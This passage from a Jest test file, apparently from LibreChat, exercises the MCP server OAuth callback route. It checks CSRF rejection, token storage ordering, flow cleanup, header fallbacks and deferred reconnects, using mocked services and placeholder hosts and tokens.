          state: 'test-user-id:test-server',
          serverName: 'test-server',
          userId: 'test-user-id',
          serverUrl: 'https://override.example.com/{{LIBRECHAT_BODY_CONVERSATIONID}}/mcp',
          metadata: {},
          clientInfo: {},
          codeVerifier: 'test-verifier',
        };

        getLogStores.mockReturnValue({});
        require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
        MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
        mockOAuthCompletion({
          access_token: 'test-token',
        });
        MCPTokenStorage.storeTokens.mockImplementation(async (params) => {
          const storedTokens = { ...params.tokens, credential_set_id: 'callback-generation' };
          await params.onStoreCommitted(storedTokens);
          return storedTokens;
        });
        mockRegistryInstance.getServerConfig.mockResolvedValue({
          url: 'https://override.example.com/{{LIBRECHAT_BODY_CONVERSATIONID}}/mcp',
        });

        const mockMcpManager = createLeasedMcpManager({
          fetchToolsSnapshot: jest.fn().mockResolvedValue({ tools: [], complete: true }),
        });
        require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
        require('~/config').getOAuthReconnectionManager.mockReturnValue({
          clearReconnection: jest.fn(),
        });
        require('~/server/services/Config/mcp').updateMCPServerTools.mockResolvedValue();

        const response = await request(app)
          .get('/api/mcp/test-server/oauth/callback')
          .query({ code: 'test-code', state: flowId });

        const basePath = getBasePath();
        expect(response.status).toBe(302);
        expect(response.headers.location).toContain(`${basePath}/oauth/success`);
        expect(mockMcpManager.clearCatalogRecoveryState).toHaveBeenCalledWith(
          'test-user-id',
          'test-server',
        );
        expect(require('~/server/services/Config').invalidateCachedTools).toHaveBeenCalledWith({
          userId: 'test-user-id',
          serverName: 'test-server',
        });
        const oauthCompletionIndex = mockFlowManager.completeFlow.mock.calls.findIndex(
          ([, type]) => type === 'mcp_oauth',
        );
        expect(oauthCompletionIndex).toBeGreaterThanOrEqual(0);
        expect(
          mockFlowManager.completeFlow.mock.invocationCallOrder[oauthCompletionIndex],
        ).toBeLessThan(mockFlowManager.settleFlowIfCurrent.mock.invocationCallOrder[0]);
      });

      it('should use the merged server config to defer request-scoped post-OAuth reconnect', async () => {
        const flowId = 'test-user-id:test-server';
        const mockFlowManager = {
          getFlowState: jest.fn().mockResolvedValue({
            status: 'PENDING',
            createdAt: Date.now(),
          }),
          completeFlow: jest.fn().mockResolvedValue(true),
          deleteFlow: jest.fn().mockResolvedValue(true),
        };
        const mockFlowState = {
          state: 'test-user-id:test-server',
          serverName: 'test-server',
          userId: 'test-user-id',
          serverUrl: 'https://override.example.com/{{LIBRECHAT_BODY_CONVERSATIONID}}/mcp',
          metadata: {},
          clientInfo: {},
          codeVerifier: 'test-verifier',
        };
        const mergedServerConfig = {
          type: 'streamable-http',
          url: 'https://override.example.com/{{LIBRECHAT_BODY_CONVERSATIONID}}/mcp',
          source: 'config',
        };
        getLogStores.mockReturnValue({});
        require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
        MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
        mockOAuthCompletion({
          access_token: 'test-token',
        });
        mockTokenStorageCommit();
        mockRegistryInstance.getServerConfig.mockResolvedValue({});
        mockResolveAllMcpConfigs.mockResolvedValue({ 'test-server': mergedServerConfig });

        const fetchOrderedToolsSnapshot = jest
          .fn()
          .mockResolvedValue({ tools: [{ name: 'search' }], complete: true });
        const mockMcpManager = createLeasedMcpManager({ fetchOrderedToolsSnapshot });
        require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
        const mockOAuthReconnectionManager = {
          clearReconnection: jest.fn(),
        };
        require('~/config').getOAuthReconnectionManager.mockReturnValue(
          mockOAuthReconnectionManager,
        );
        const { updateMCPServerTools } = require('~/server/services/Config/mcp');
        updateMCPServerTools.mockResolvedValue();

        const response = await request(app)
          .get('/api/mcp/test-server/oauth/callback')
          .query({ code: 'test-code', state: flowId });

        expect(response.status).toBe(302);
        expect(mockResolveAllMcpConfigs).toHaveBeenCalledWith('test-user-id');
        expect(fetchOrderedToolsSnapshot).not.toHaveBeenCalled();
        expect(mockMcpManager.withUserConnectionLease).not.toHaveBeenCalled();
        expect(mockOAuthReconnectionManager.clearReconnection).toHaveBeenCalledWith(
          'test-user-id',
          'test-server',
        );
        expect(updateMCPServerTools).not.toHaveBeenCalled();
      });

      it('should resolve and forward customUserVars so header templates are substituted on first post-callback connection', async () => {
        const flowId = 'test-user-id:test-server';
        const mockFlowManager = {
          getFlowState: jest.fn().mockResolvedValue({
            status: 'PENDING',
            createdAt: Date.now(),
          }),
          completeFlow: jest.fn().mockResolvedValue(true),
          deleteFlow: jest.fn().mockResolvedValue(true),
        };
        const mockFlowState = {
          state: 'test-user-id:test-server',
          serverName: 'test-server',
          userId: 'test-user-id',
          serverUrl: 'https://override.example.com/mcp',
          metadata: {},
          clientInfo: {},
          codeVerifier: 'test-verifier',
        };
        const mergedServerConfig = {
          type: 'streamable-http',
          url: 'https://override.example.com/mcp',
          source: 'config',
          customUserVars: {
            LITELLM_KEY: { title: 'LiteLLM Key' },
          },
        };
        const fetchedTools = [{ name: 'search', inputSchema: { type: 'object' } }];

        getLogStores.mockReturnValue({});
        require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
        MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
        mockOAuthCompletion({
          access_token: 'test-token',
        });
        mockTokenStorageCommit();
        mockRegistryInstance.getServerConfig.mockResolvedValue({});
        mockResolveAllMcpConfigs.mockResolvedValue({ 'test-server': mergedServerConfig });
        require('@librechat/api').getUserMCPAuthMap.mockResolvedValueOnce({
          [`mcp_test-server`]: { LITELLM_KEY: 'sk-real-user-key' },
        });

        const mockMcpManager = createLeasedMcpManager({
          fetchToolsSnapshot: jest.fn().mockResolvedValue({ tools: fetchedTools, complete: true }),
        });
        require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
        require('~/config').getOAuthReconnectionManager.mockReturnValue({
          clearReconnection: jest.fn(),
        });
        const { updateMCPServerTools } = require('~/server/services/Config/mcp');
        updateMCPServerTools.mockResolvedValue();

        const response = await request(app)
          .get('/api/mcp/test-server/oauth/callback')
          .query({ code: 'test-code', state: flowId });

        expect(response.status).toBe(302);
        expect(require('@librechat/api').getUserMCPAuthMap).toHaveBeenCalledWith({
          userId: 'test-user-id',
          servers: ['test-server'],
          findPluginAuthsByKeys: require('~/models').findPluginAuthsByKeys,
        });
        expect(mockMcpManager.withUserConnectionLease).toHaveBeenCalledWith(
          expect.objectContaining({ customUserVars: { LITELLM_KEY: 'sk-real-user-key' } }),
          expect.any(Function),
        );
      });

      it('should not call getUserMCPAuthMap when the server has no customUserVars', async () => {
        const flowId = 'test-user-id:test-server';
        const mockFlowManager = {
          getFlowState: jest.fn().mockResolvedValue({
            status: 'PENDING',
            createdAt: Date.now(),
          }),
          completeFlow: jest.fn().mockResolvedValue(true),
          deleteFlow: jest.fn().mockResolvedValue(true),
        };
        const mockFlowState = {
          state: 'test-user-id:test-server',
          serverName: 'test-server',
          userId: 'test-user-id',
          serverUrl: 'https://override.example.com/mcp',
          metadata: {},
          clientInfo: {},
          codeVerifier: 'test-verifier',
        };
        const mergedServerConfig = {
          type: 'streamable-http',
          url: 'https://override.example.com/mcp',
          source: 'config',
        };
        const fetchedTools = [{ name: 'search', inputSchema: { type: 'object' } }];

        getLogStores.mockReturnValue({});
        require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
        MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
        mockOAuthCompletion({
          access_token: 'test-token',
        });
        mockTokenStorageCommit();
        mockRegistryInstance.getServerConfig.mockResolvedValue({});
        mockResolveAllMcpConfigs.mockResolvedValue({ 'test-server': mergedServerConfig });
        require('@librechat/api').getUserMCPAuthMap.mockClear();

        const mockMcpManager = createLeasedMcpManager({
          fetchToolsSnapshot: jest.fn().mockResolvedValue({ tools: fetchedTools, complete: true }),
        });
        require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
        require('~/config').getOAuthReconnectionManager.mockReturnValue({
          clearReconnection: jest.fn(),
        });
        const { updateMCPServerTools } = require('~/server/services/Config/mcp');
        updateMCPServerTools.mockResolvedValue();

        const response = await request(app)
          .get('/api/mcp/test-server/oauth/callback')
          .query({ code: 'test-code', state: flowId });

        expect(response.status).toBe(302);
        expect(require('@librechat/api').getUserMCPAuthMap).not.toHaveBeenCalled();
        expect(mockMcpManager.withUserConnectionLease).toHaveBeenCalledWith(
          expect.objectContaining({ customUserVars: undefined }),
          expect.any(Function),
        );
      });

      it('should reject when no PENDING flow exists and no cookies are present', async () => {
        const flowId = 'test-user-id:test-server';
        const mockFlowManager = {
          getFlowState: jest.fn().mockResolvedValue(null),
        };

        getLogStores.mockReturnValue({});
        require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

        const response = await request(app)
          .get('/api/mcp/test-server/oauth/callback')
          .query({ code: 'test-code', state: flowId });

        const basePath = getBasePath();
        expect(response.status).toBe(302);
        expect(response.headers.location).toBe(
          `${basePath}/oauth/error?error=csrf_validation_failed`,
        );
      });

      it('should reject when only a COMPLETED flow exists (not PENDING)', async () => {
        const flowId = 'test-user-id:test-server';
        const mockFlowManager = {
          getFlowState: jest.fn().mockResolvedValue({
            status: 'COMPLETED',
            createdAt: Date.now(),
          }),
        };

        getLogStores.mockReturnValue({});
        require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

        const response = await request(app)
          .get('/api/mcp/test-server/oauth/callback')
          .query({ code: 'test-code', state: flowId });

        const basePath = getBasePath();
        expect(response.status).toBe(302);
        expect(response.headers.location).toBe(
          `${basePath}/oauth/error?error=csrf_validation_failed`,
        );
      });

      it('should reject when PENDING flow is stale (older than PENDING_STALE_MS)', async () => {
        const flowId = 'test-user-id:test-server';
        const mockFlowManager = {
          getFlowState: jest.fn().mockResolvedValue({
            status: 'PENDING',
            createdAt: Date.now() - PENDING_STALE_MS - 60 * 1000,
          }),
        };

        getLogStores.mockReturnValue({});
        require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

        const response = await request(app)
          .get('/api/mcp/test-server/oauth/callback')
          .query({ code: 'test-code', state: flowId });

        const basePath = getBasePath();
        expect(response.status).toBe(302);
        expect(response.headers.location).toBe(
          `${basePath}/oauth/error?error=csrf_validation_failed`,
        );
      });
    });

    it('rejects a callback when a deleted server name belongs to a replacement generation', async () => {
      const flowId = 'test-user-id:test-server';
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({ status: 'PENDING', createdAt: Date.now() }),
      };
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      MCPOAuthHandler.getFlowState.mockResolvedValue({
        state: flowId,
        serverName: 'test-server',
        userId: 'test-user-id',
        serverUrl: 'https://old.example.com/mcp',
        serverGeneration: 'db:old-id',
      });
      mockRegistryInstance.getServerConfig.mockResolvedValue({
        dbId: 'replacement-id',
        url: 'https://old.example.com/mcp',
      });

      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${generateTestCsrfToken(flowId)}`])
        .query({ code: 'test-auth-code', state: flowId });

      expect(response.status).toBe(302);
      expect(response.headers.location).toContain('/oauth/error');
      expect(MCPOAuthHandler.completeOAuthFlow).not.toHaveBeenCalled();
      expect(MCPTokenStorage.storeTokens).not.toHaveBeenCalled();
    });

    it('keeps a Config callback live when inspected config resolution omits the server', async () => {
      const flowId = 'test-user-id:test-server';
      const rawConfig = {
        type: 'streamable-http',
        url: 'https://runtime.example.com/{{LIBRECHAT_USER_ID}}',
      };
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({ status: 'PENDING', createdAt: Date.now() }),
      };
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      require('~/server/services/Config').getAppConfig.mockResolvedValueOnce({
        mcpConfig: { 'test-server': rawConfig },
      });
      MCPOAuthHandler.getFlowState.mockResolvedValue({
        state: flowId,
        serverName: 'test-server',
        userId: 'test-user-id',
        serverUrl: 'https://runtime.example.com/test-user-id',
        serverGeneration: `config:${JSON.stringify(rawConfig)}`,
      });
      MCPOAuthHandler.completeOAuthFlow.mockRejectedValue(new Error('stop after liveness check'));
      mockResolveAllMcpConfigs.mockResolvedValue({});
      mockRegistryInstance.getServerConfig.mockResolvedValue(undefined);

      await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${generateTestCsrfToken(flowId)}`])
        .query({ code: 'test-auth-code', state: flowId });

      expect(MCPOAuthHandler.completeOAuthFlow).toHaveBeenCalled();
    });

    it('should handle OAuth callback successfully', async () => {
      // mockRegistryInstance is defined at the top of the file
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({ status: 'PENDING', createdAt: Date.now() }),
        completeFlow: jest.fn().mockResolvedValue(),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };
      const mockFlowState = {
        oauthPersistenceWaitTimeout: 60000,
        state: 'test-user-id:test-server',
        serverName: 'test-server',
        userId: 'test-user-id',
        serverUrl: 'https://mcp.example.com/mcp',
        metadata: { toolFlowId: 'tool-flow-123' },
        clientInfo: {},
        codeVerifier: 'test-verifier',
      };
      const mockTokens = {
        access_token: 'test-access-token',
        refresh_token: 'test-refresh-token',
      };

      MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
      mockOAuthCompletion(mockTokens);
      mockTokenStorageCommit();
      mockRegistryInstance.getServerConfig.mockResolvedValue({
        url: 'https://mcp.example.com/mcp',
      });
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const mockUserConnection = {
        fetchToolsSnapshot: jest.fn().mockResolvedValue({
          tools: [
            {
              name: 'test-tool',
              description: 'A test tool',
              inputSchema: { type: 'object' },
            },
          ],
          complete: true,
        }),
      };
      const mockMcpManager = {
        withUserConnectionLease: jest.fn((_options, useConnection) =>
          useConnection(mockUserConnection),
        ),
      };
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);

      const { getCachedTools, setCachedTools } = require('~/server/services/Config');
      const { Constants } = require('librechat-data-provider');
      getCachedTools.mockResolvedValue({
        [`existing-tool${Constants.mcp_delimiter}test-server`]: { type: 'function' },
        [`other-tool${Constants.mcp_delimiter}other-server`]: { type: 'function' },
      });
      setCachedTools.mockResolvedValue();

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({
          code: 'test-auth-code',
          state: flowId,
        });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/success?serverName=test-server`);
      expect(MCPOAuthHandler.completeOAuthFlow).toHaveBeenCalledWith(
        flowId,
        'test-auth-code',
        mockFlowManager,
        {},
        expect.any(Function),
        expect.any(Function),
        expect.objectContaining({ state: flowId }),
      );
      expect(MCPTokenStorage.storeTokens).toHaveBeenCalledWith(
        expect.objectContaining({
          flowManager: mockFlowManager,
          persistenceWaitTimeoutMs: 60000,
          userId: 'test-user-id',
          serverName: 'test-server',
          tokens: mockTokens,
          clientInfo: mockFlowState.clientInfo,
          metadata: mockFlowState.metadata,
        }),
      );
      const storeInvocation = MCPTokenStorage.storeTokens.mock.invocationCallOrder[0];
      const flowCompletionInvocation = mockFlowManager.completeFlow.mock.invocationCallOrder[0];
      const connectInvocation = mockMcpManager.withUserConnectionLease.mock.invocationCallOrder[0];
      expect(storeInvocation).toBeLessThan(flowCompletionInvocation);
      expect(storeInvocation).toBeLessThan(connectInvocation);
      expect(mockFlowManager.completeFlow).toHaveBeenCalledWith(
        'tool-flow-123',
        'mcp_oauth',
        mockTokens,
      );
      expect(mockFlowManager.deleteFlow).toHaveBeenCalledWith(
        'test-user-id:test-server',
        'mcp_get_tokens',
      );
    });

    it('should clear tenant-scoped token flow state after storing callback tokens', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({ status: 'PENDING', createdAt: Date.now() }),
        completeFlow: jest.fn().mockResolvedValue(),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };
      const mockFlowState = {
        state: 'test-user-id:test-server',
        serverName: 'test-server',
        userId: 'test-user-id',
        metadata: {
          toolFlowId: 'tool-flow-123',
          token_endpoint: 'https://auth.example.com/token',
        },
        resourceMetadata: { resource: 'https://api.example.com/' },
        clientInfo: {},
        codeVerifier: 'test-verifier',
        tenantId: 'tenant-a',
      };
      const mockTokens = {
        access_token: 'test-access-token',
        refresh_token: 'test-refresh-token',
      };

      MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
      mockOAuthCompletion(mockTokens);
      mockTokenStorageCommit();
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      require('~/config').getOAuthReconnectionManager.mockReturnValue({
        clearReconnection: jest.fn(),
      });
      require('~/config').getMCPManager.mockReturnValue(
        createLeasedMcpManager({
          fetchToolsSnapshot: jest.fn().mockResolvedValue({ tools: [], complete: true }),
        }),
      );
      const { getCachedTools, setCachedTools } = require('~/server/services/Config');
      getCachedTools.mockResolvedValue({});
      setCachedTools.mockResolvedValue();

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({
          code: 'test-auth-code',
          state: flowId,
        });

      expect(response.status).toBe(302);
      expect(MCPTokenStorage.storeTokens).toHaveBeenCalledWith(
        expect.objectContaining({
          metadata: expect.objectContaining({
            resource: 'https://api.example.com/',
          }),
        }),
      );
      expect(mockFlowManager.deleteFlow).toHaveBeenCalledWith(
        'tenant:tenant-a:test-user-id:test-server',
        'mcp_get_tokens',
      );
      expect(mockFlowManager.deleteFlow).toHaveBeenCalledWith(flowId, 'mcp_get_tokens');
    });

    it('should complete pending token flow waiters after storing callback tokens', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockImplementation((id, type) => {
          if (type === 'mcp_get_tokens' && id === 'tenant:tenant-a:test-user-id:test-server') {
            return Promise.resolve({
              type: 'mcp_get_tokens',
              status: 'PENDING',
              createdAt: 123,
            });
          }
          return Promise.resolve({ status: 'PENDING', createdAt: Date.now() });
        }),
        completeFlow: jest.fn().mockResolvedValue(true),
        settleFlowIfCurrent: jest.fn().mockResolvedValue('updated'),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };
      const mockFlowState = {
        state: 'test-user-id:test-server',
        serverName: 'test-server',
        userId: 'test-user-id',
        metadata: {},
        clientInfo: {},
        codeVerifier: 'test-verifier',
        tenantId: 'tenant-a',
      };
      const mockTokens = {
        access_token: 'fresh-access-token',
        refresh_token: 'fresh-refresh-token',
      };
      const storedTokens = {
        ...mockTokens,
        credential_set_id: 'persisted-generation',
      };

      MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
      mockOAuthCompletion(mockTokens);
      mockTokenStorageCommit(storedTokens);
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      require('~/config').getOAuthReconnectionManager.mockReturnValue({
        clearReconnection: jest.fn(),
      });
      require('~/config').getMCPManager.mockReturnValue(
        createLeasedMcpManager({
          fetchToolsSnapshot: jest.fn().mockResolvedValue({ tools: [], complete: true }),
        }),
      );
      const { getCachedTools, setCachedTools } = require('~/server/services/Config');
      getCachedTools.mockResolvedValue({});
      setCachedTools.mockResolvedValue();

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({
          code: 'test-auth-code',
          state: flowId,
        });

      expect(response.status).toBe(302);
      expect(mockFlowManager.settleFlowIfCurrent).toHaveBeenCalledWith(
        'tenant:tenant-a:test-user-id:test-server',
        'mcp_get_tokens',
        123,
        '',
        storedTokens,
      );
      expect(mockFlowManager.deleteFlow).not.toHaveBeenCalledWith(
        'tenant:tenant-a:test-user-id:test-server',
        'mcp_get_tokens',
      );
      expect(mockFlowManager.deleteFlow).toHaveBeenCalledWith(flowId, 'mcp_get_tokens');
    });

    it('should use oauthHeaders from flow state when present', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({ status: 'PENDING', createdAt: Date.now() }),
        completeFlow: jest.fn().mockResolvedValue(),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };
      const mockFlowState = {
        state: 'test-user-id:test-server',
        serverName: 'test-server',
        userId: 'test-user-id',
        serverUrl: 'https://mcp.example.com/mcp',
        metadata: { toolFlowId: 'tool-flow-123' },
        clientInfo: {},
        codeVerifier: 'test-verifier',
        oauthHeaders: { 'X-Custom-Auth': 'header-value' },
      };
      const mockTokens = { access_token: 'tok', refresh_token: 'ref' };

      MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
      mockOAuthCompletion(mockTokens);
      mockTokenStorageCommit();
      mockResolveAllMcpConfigs.mockResolvedValue({
        'test-server': { url: 'https://mcp.example.com/mcp' },
      });
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      require('~/config').getOAuthReconnectionManager.mockReturnValue({
        clearReconnection: jest.fn(),
      });
      require('~/config').getMCPManager.mockReturnValue(
        createLeasedMcpManager({
          fetchToolsSnapshot: jest.fn().mockResolvedValue({ tools: [], complete: true }),
        }),
      );
      const { getCachedTools, setCachedTools } = require('~/server/services/Config');
      getCachedTools.mockResolvedValue({});
      setCachedTools.mockResolvedValue();

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({ code: 'auth-code', state: flowId });

      expect(MCPOAuthHandler.completeOAuthFlow).toHaveBeenCalledWith(
        flowId,
        'auth-code',
        mockFlowManager,
        { 'X-Custom-Auth': 'header-value' },
        expect.any(Function),
        expect.any(Function),
        expect.objectContaining({ state: flowId }),
      );
      expect(mockRegistryInstance.getServerConfig).not.toHaveBeenCalled();
    });

    it('should fall back to registry oauth_headers when flow state lacks them', async () => {
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({ status: 'PENDING', createdAt: Date.now() }),
        completeFlow: jest.fn().mockResolvedValue(),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };
      const mockFlowState = {
        state: 'test-user-id:test-server',
        serverName: 'test-server',
        userId: 'test-user-id',
        serverUrl: 'https://mcp.example.com/mcp',
        metadata: { toolFlowId: 'tool-flow-123' },
        clientInfo: {},
        codeVerifier: 'test-verifier',
      };
      const mockTokens = { access_token: 'tok', refresh_token: 'ref' };

      MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
      mockOAuthCompletion(mockTokens);
      mockTokenStorageCommit();
      mockRegistryInstance.getServerConfig.mockResolvedValue({
        url: 'https://mcp.example.com/mcp',
        oauth_headers: { 'X-Registry-Header': 'from-registry' },
      });
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      require('~/config').getOAuthReconnectionManager.mockReturnValue({
        clearReconnection: jest.fn(),
      });
      require('~/config').getMCPManager.mockReturnValue(
        createLeasedMcpManager({
          fetchToolsSnapshot: jest.fn().mockResolvedValue({ tools: [], complete: true }),
        }),
      );
      const { getCachedTools, setCachedTools } = require('~/server/services/Config');
      getCachedTools.mockResolvedValue({});
      setCachedTools.mockResolvedValue();

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({ code: 'auth-code', state: flowId });

      expect(MCPOAuthHandler.completeOAuthFlow).toHaveBeenCalledWith(
        flowId,
        'auth-code',
        mockFlowManager,
        { 'X-Registry-Header': 'from-registry' },
        expect.any(Function),
        expect.any(Function),
        expect.objectContaining({ state: flowId }),
      );
      expect(mockRegistryInstance.getServerConfig).toHaveBeenCalledWith(
        'test-server',
        'test-user-id',
        undefined,
      );
    });

    it('should redirect to error page when callback processing fails', async () => {
      MCPOAuthHandler.getFlowState.mockRejectedValue(new Error('Callback error'));
      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({
          code: 'test-auth-code',
          state: flowId,
        });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/error?error=callback_failed`);
    });

    it('should handle system-level OAuth completion', async () => {
      // mockRegistryInstance is defined at the top of the file
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({ status: 'PENDING', createdAt: Date.now() }),
        completeFlow: jest.fn().mockResolvedValue(),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };
      const mockFlowState = {
        state: 'test-user-id:test-server',
        serverName: 'test-server',
        userId: 'system',
        metadata: { toolFlowId: 'tool-flow-123' },
        clientInfo: {},
        codeVerifier: 'test-verifier',
      };
      const mockTokens = {
        access_token: 'test-access-token',
        refresh_token: 'test-refresh-token',
      };

      MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
      mockOAuthCompletion(mockTokens);
      mockTokenStorageCommit();
      mockRegistryInstance.getServerConfig.mockResolvedValue({});
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({
          code: 'test-auth-code',
          state: flowId,
        });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/success?serverName=test-server`);
      expect(mockFlowManager.deleteFlow).toHaveBeenCalledWith(flowId, 'mcp_get_tokens');
    });

    it('should handle reconnection failure after OAuth', async () => {
      // mockRegistryInstance is defined at the top of the file
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({ status: 'PENDING', createdAt: Date.now() }),
        completeFlow: jest.fn().mockResolvedValue(),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };
      const mockFlowState = {
        state: 'test-user-id:test-server',
        serverName: 'test-server',
        userId: 'test-user-id',
        metadata: { toolFlowId: 'tool-flow-123' },
        clientInfo: {},
        codeVerifier: 'test-verifier',
      };
      const mockTokens = {
        access_token: 'test-access-token',
        refresh_token: 'test-refresh-token',
      };

      MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
      mockOAuthCompletion(mockTokens);
      mockTokenStorageCommit();
      mockRegistryInstance.getServerConfig.mockResolvedValue({});
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);

      const mockMcpManager = {
        withUserConnectionLease: jest.fn().mockRejectedValue(new Error('Reconnection failed')),
      };
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);

      const { getCachedTools, setCachedTools } = require('~/server/services/Config');
      getCachedTools.mockResolvedValue({});
      setCachedTools.mockResolvedValue();

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);

      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({
          code: 'test-auth-code',
          state: flowId,
        });
      const basePath = getBasePath();

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(`${basePath}/oauth/success?serverName=test-server`);
      expect(MCPTokenStorage.storeTokens).toHaveBeenCalled();
      expect(mockFlowManager.deleteFlow).toHaveBeenCalledWith(flowId, 'mcp_get_tokens');
    });

    it('defers request-scoped post-OAuth reconnect while completing the waiting tool flow', async () => {
      const { logger } = require('@librechat/data-schemas');
      const { updateMCPServerTools } = require('~/server/services/Config/mcp');
      const mockFlowManager = {
        getFlowState: jest.fn().mockResolvedValue({ status: 'PENDING', createdAt: Date.now() }),
        completeFlow: jest.fn().mockResolvedValue(true),
        deleteFlow: jest.fn().mockResolvedValue(true),
      };
      const mockFlowState = {
        state: 'test-user-id:test-server',
        serverName: 'test-server',
        userId: 'test-user-id',
        serverUrl: 'https://mcp.example.com/mcp',
        metadata: { toolFlowId: 'tool-flow-request-scoped' },
        clientInfo: {},
        codeVerifier: 'test-verifier',
      };
      const mockTokens = {
        access_token: 'test-access-token',
        refresh_token: 'test-refresh-token',
      };
      const mockMcpManager = {
        withUserConnectionLease: jest.fn(),
      };
      const mockOAuthReconnectionManager = {
        clearReconnection: jest.fn(),
      };

      MCPOAuthHandler.getFlowState.mockResolvedValue(mockFlowState);
      mockOAuthCompletion(mockTokens);
      mockTokenStorageCommit(mockTokens);
      mockResolveAllMcpConfigs.mockResolvedValue({
        'test-server': {
          type: 'streamable-http',
          url: 'https://mcp.example.com/mcp',
          source: 'yaml',
          headers: {
            'X-Conversation-ID': '{{LIBRECHAT_BODY_CONVERSATIONID}}',
          },
          requiresOAuth: true,
        },
      });
      getLogStores.mockReturnValue({});
      require('~/config').getFlowStateManager.mockReturnValue(mockFlowManager);
      require('~/config').getMCPManager.mockReturnValue(mockMcpManager);
      require('~/config').getOAuthReconnectionManager.mockReturnValue(mockOAuthReconnectionManager);

      const flowId = 'test-user-id:test-server';
      const csrfToken = generateTestCsrfToken(flowId);
      const response = await request(app)
        .get('/api/mcp/test-server/oauth/callback')
        .set('Cookie', [`oauth_csrf=${csrfToken}`])
        .query({ code: 'test-auth-code', state: flowId });

      expect(response.status).toBe(302);
      expect(response.headers.location).toBe(
